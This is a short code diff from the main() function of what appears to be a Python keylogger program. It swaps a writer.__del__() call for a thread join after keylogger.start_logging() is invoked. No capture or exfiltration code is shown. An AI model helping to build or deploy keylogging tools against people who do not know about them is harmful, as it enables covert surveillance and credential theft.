@@ -17,7 +17,7 @@ def main() -> None:
     writer_thread.setDaemon(True)
     writer_thread.start()
     keylogger.start_logging()
-    writer.__del__()
+    writer_thread.join()
     sys.exit()
 
 
